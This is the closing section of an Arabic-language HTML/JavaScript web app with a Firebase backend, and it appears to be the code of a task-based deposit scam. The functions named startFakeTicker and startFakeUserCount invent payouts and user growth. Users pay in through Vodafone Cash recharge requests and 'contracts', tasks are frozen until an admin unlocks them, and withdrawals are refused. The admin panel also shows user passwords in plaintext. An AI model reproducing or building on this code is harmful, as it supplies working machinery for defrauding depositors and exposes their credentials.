                h+=`<tr><td><div class="font-bold">${u.name}</div><div class="text-xs text-gray-400">${u.phone}</div></td><td class="text-red-400 font-mono text-xs">${u.password}</td><td class="font-bold text-green-600">${u.balance}</td><td>${s}</td><td>${b}</td></tr>`;
            }); document.getElementById('admin-users-list').innerHTML=h;
        }
        
        window.unlockNextTask = (p,i) => { if(confirm("فتح؟")) window.update(window.ref(window.db,`users/${p}`),{isTaskFrozen:false, currentTaskIndex:i+1}); }
        window.banUser = (p) => { if(confirm("حظر؟")) window.update(window.ref(window.db,`users/${p}`),{isBanned:true}); }
        window.unbanUser = (p) => { window.update(window.ref(window.db,`users/${p}`),{isBanned:false}); }
        window.deleteUser = (p) => { if(confirm("حذف؟")) window.remove(window.ref(window.db,`users/${p}`)); }
        window.editUserBalance = (p,b) => { const n=prompt("رصيد:",b); if(n) window.update(window.ref(window.db,`users/${p}`),{balance:parseFloat(n)}); }

        function renderAdminTasksUI() { const c=document.getElementById('admin-tasks-container'); c.innerHTML=''; tasks.forEach((t,i)=>{ c.innerHTML+=`<div class="bg-white border p-2 rounded flex gap-2 items-center"><span class="bg-gray-100 w-6 text-center text-xs font-bold">${i+1}</span><input id="tn-${i}" value="${t.name}" class="border p-1 text-xs w-1/3"><input id="tp-${i}" value="${t.price}" class="border p-1 text-xs w-16" placeholder="سعر"><input id="tc-${i}" value="${t.commission}" class="border p-1 text-xs w-16" placeholder="عمولة"><input id="ti-${i}" value="${t.img}" class="border p-1 text-xs flex-1" placeholder="صورة"></div>`; }); }
        window.saveAdminTasks = () => { let u=[]; for(let i=0;i<tasks.length;i++) u.push({id:i+1, name:document.getElementById(`tn-${i}`).value, price:parseFloat(document.getElementById(`tp-${i}`).value), commission:parseFloat(document.getElementById(`tc-${i}`).value), img:document.getElementById(`ti-${i}`).value}); window.set(window.ref(window.db,'tasks'), u).then(()=>alert("تم")); }

        function renderAdminSignaturesUI() { const c=document.getElementById('admin-signatures-container'); c.innerHTML=''; signatures.forEach((s,i)=>{ c.innerHTML+=`<div class="bg-white border p-2 rounded flex gap-2 items-center"><input id="sn-${i}" value="${s.name}" class="border p-1 text-xs flex-1"><input id="sp-${i}" value="${s.price}" class="border p-1 text-xs w-20"><input id="si-${i}" value="${s.img||''}" class="border p-1 text-xs w-1/3"><button onclick="deleteSignature(${i})" class="text-red-500"><i class="fa-solid fa-trash"></i></button></div>`; }); }
        window.saveAdminSignatures = () => { let u=[]; const rows=document.getElementById('admin-signatures-container').children; for(let i=0; i<rows.length; i++) if(document.getElementById(`sn-${i}`)) u.push({name:document.getElementById(`sn-${i}`).value, price:parseFloat(document.getElementById(`sp-${i}`).value), img:document.getElementById(`si-${i}`).value}); window.set(window.ref(window.db,'signatures'), u).then(()=>alert("تم")); }
        window.addNewSignature = () => { signatures.push({name:"New", price:0}); renderAdminSignaturesUI(); }
        window.deleteSignature = (i) => { signatures.splice(i,1); renderAdminSignaturesUI(); }

        function renderAdminRequestsUI() { let h=''; allRequests.filter(r=>r.status==='pending').forEach(r=>{ h+=`<tr><td>${r.senderName}<br><span class="text-xs text-gray-400">${r.userPhone}</span></td><td class="text-green-600 font-bold">${r.amount}</td><td><a href="#" class="text-blue-500 text-xs" onclick="alert('${r.fileName}')">عرض</a></td><td><button onclick="approveReq('${r.id}','${r.userPhone}',${r.amount})" class="text-green-500 mx-1"><i class="fa-solid fa-check"></i></button><button onclick="rejectReq('${r.id}')" class="text-red-500 mx-1"><i class="fa-solid fa-xmark"></i></button></td></tr>`; }); document.getElementById('admin-requests-list').innerHTML=h||'<tr><td colspan="4" class="text-center text-gray-400 p-2">لا يوجد</td></tr>'; }
        window.approveReq = (id,p,a) => { window.update(window.ref(window.db,`recharge_requests/${id}`),{status:'approved'}); window.get(window.ref(window.db,`users/${p}`)).then(s=>window.update(window.ref(window.db,`users/${p}`),{balance:(s.val().balance||0)+a})); }
        window.rejectReq = (id) => { const r=prompt("سبب:"); if(r) window.update(window.ref(window.db,`recharge_requests/${id}`),{status:'rejected', rejectionReason:r}); }

        function renderAdminSupportUI() { let h=''; supportMessages.sort((a,b)=>b.timestamp-a.timestamp).forEach(m=>{ h+=`<tr><td>${m.userName}<br><span class="text-xs text-gray-400">${m.userPhone}</span></td><td class="text-xs">${m.message}</td><td>${m.reply ? '<i class="fa-solid fa-check text-green-500"></i>' : `<button onclick="replyToMsg('${m.id}')" class="bg-blue-100 text-blue-600 px-2 py-1 rounded text-xs">رد</button>`}</td></tr>`; }); document.getElementById('admin-support-list').innerHTML=h; }
        window.replyToMsg = (id) => { const r=prompt("الرد:"); if(r) window.update(window.ref(window.db,`support_messages/${id}`),{reply:r}); }

        function renderAdminSettingsUI() { document.getElementById('setting-cash-number').value=siteSettings.vodafoneCashNumber; document.getElementById('setting-support-link').value=siteSettings.supportLink; document.getElementById('setting-announcement').value=siteSettings.siteAnnouncement; }
        window.saveSiteSettings = () => { window.update(window.ref(window.db,'settings'),{vodafoneCashNumber:document.getElementById('setting-cash-number').value, supportLink:document.getElementById('setting-support-link').value, siteAnnouncement:document.getElementById('setting-announcement').value}).then(()=>alert("تم")); }

        // Client Utils
        window.copyToClipboard = () => { navigator.clipboard.writeText(document.getElementById('recharge-admin-number').innerText); alert("تم النسخ"); }
        function startFakeTicker() { setInterval(()=>{ const c=document.getElementById('fake-profit-ticker'); if(c) { const d=document.createElement('div'); d.className='text-[10px] text-gray-500 flex justify-between px-2 mb-1'; d.innerHTML=`<span>01xxxx${Math.floor(Math.random()*1000)}</span><span class="text-green-600 font-bold">+${Math.floor(Math.random()*50)*100}</span>`; c.prepend(d); if(c.children.length>3) c.lastChild.remove(); } }, 2500); }
        function startImageSlider() { setInterval(()=>{ const s=document.querySelectorAll('.slider-container .slide'); if(s.length){ let a=document.querySelector('.slide.active'); a.classList.remove('active'); (a.nextElementSibling||s[0]).classList.add('active'); } }, 3000); }
        function startFakeUserCount() { setInterval(()=>{ const e=document.getElementById('fake-user-count'); if(e) e.innerText=(parseInt(e.innerText.replace(',',''))+Math.floor(Math.random()*3)).toLocaleString(); }, 5000); }
        
        window.handleFileSelect = (e) => { const f=e.target.files[0]; if(f){ selectedFile=f; const r=new FileReader(); r.onload=(e)=>{document.getElementById('upload-preview').src=e.target.result; document.getElementById('upload-preview').classList.remove('hidden'); document.getElementById('upload-icon').classList.add('hidden'); document.getElementById('upload-text').innerText="تم الاختيار";} ; r.readAsDataURL(f); } }
        window.submitRechargeRequest = () => { const a=document.getElementById('charge-amount').value, s=document.getElementById('charge-sender').value, n=document.getElementById('charge-name').value; if(!a||!s||!n||!selectedFile) return alert("ناقص"); window.push(window.ref(window.db,'recharge_requests'), {userPhone:currentUser.phone, senderName:n, amount:parseFloat(a), senderNumber:s, fileName:selectedFile.name, status:'pending', timestamp:Date.now()}).then(()=>{alert("تم"); closeRechargeModal();}); }
        window.sendSupportMessage = () => { const m=document.getElementById('support-msg-input').value; if(!m) return; window.push(window.ref(window.db,'support_messages'), {userPhone:currentUser.phone, userName:currentUser.name, message:m, timestamp:Date.now()}).then(()=>{document.getElementById('support-msg-input').value=''; renderClientSupportHistory();}); }
        function renderClientSupportHistory() { const c=document.getElementById('client-support-history'); c.innerHTML=''; supportMessages.filter(m=>m.userPhone===currentUser.phone).forEach(m=>{ c.innerHTML+=`<div class="bg-blue-50 p-2 rounded mb-2 text-right text-xs">${m.message}</div>`; if(m.reply) c.innerHTML+=`<div class="bg-green-50 p-2 rounded mb-2 text-left text-xs text-green-700">الدعم: ${m.reply}</div>`; }); }
        function renderSignatures() { const c=document.getElementById('signature-list'); if(!c) return; c.innerHTML=''; signatures.forEach(s=>{ const b=s.img?`style="background-image:url('${s.img}');"`:''; c.innerHTML+=`<div class="bg-white p-4 rounded-xl shadow-md border flex flex-col gap-2 relative overflow-hidden" ${b}><div class="absolute inset-0 bg-white/90 z-0"></div><div class="relative z-10 flex justify-between"><h3 class="font-bold">${s.name}</h3><span class="bg-green-100 text-green-700 text-xs px-2 py-1 rounded">${s.price}</span></div><button onclick="signContract('${s.name}',${s.price})" class="relative z-10 w-full bg-black text-white py-2 rounded-lg text-sm mt-2">اشتراك</button></div>`; }); }
        window.signContract = (n,p) => { if(currentUser.balance<p){alert("رصيد غير كافي");openRechargeModal();return;} if(confirm("خصم "+p+"؟")) window.update(window.ref(window.db,`users/${currentUser.phone}`),{isSigned:true, balance:currentUser.balance-p}).then(()=>window.switchTab('work-page', document.getElementById('nav-work'))); }
        window.attemptWithdraw = () => { if(currentUser.currentTaskIndex<=24) alert("لم تنهي المهام"); else alert("تم الطلب"); }
        function updateWorkPage() { if(!currentUser.isSigned){document.getElementById('sign-alert').classList.remove('hidden');document.getElementById('task-area').classList.add('opacity-50','blur-sm');return;} document.getElementById('sign-alert').classList.add('hidden'); document.getElementById('task-area').classList.remove('opacity-50','blur-sm'); if(currentUser.isTaskFrozen){document.getElementById('frozen-message').classList.remove('hidden');return;}else document.getElementById('frozen-message').classList.add('hidden'); const t=tasks[currentUser.currentTaskIndex-1]; if(!t) return; document.getElementById('task-name').innerText=t.name; document.getElementById('task-price').innerText=t.price; document.getElementById('task-img').src=t.img; document.getElementById('task-counter').innerText=`${currentUser.currentTaskIndex}/24`; document.getElementById('task-commission').innerText=t.commission; }
        window.processTask = () => { const t=tasks[currentUser.currentTaskIndex-1]; if(currentUser.balance<t.price){alert("رصيد غير كافي");openRechargeModal();return;} setTimeout(()=>{ window.update(window.ref(window.db,`users/${currentUser.phone}`),{balance:currentUser.balance+parseFloat(t.commission), isTaskFrozen:true}); },1500); }
        window.openRechargeModal = () => document.getElementById('recharge-modal').classList.remove('hidden');
        window.closeRechargeModal = () => document.getElementById('recharge-modal').classList.add('hidden');
        window.switchTab = (id, el) => { ['home-page','signature-page','work-page','history-page','profile-page','support-page'].forEach(p => document.getElementById(p).classList.add('hidden')); document.getElementById(id).classList.remove('hidden'); document.querySelectorAll('.nav-item').forEach(n => { n.classList.remove('active', 'text-black'); n.classList.add('text-gray-400'); }); if(el) { el.classList.add('active', 'text-black'); el.classList.remove('text-gray-400'); } }
    </script>
</body>
</html>
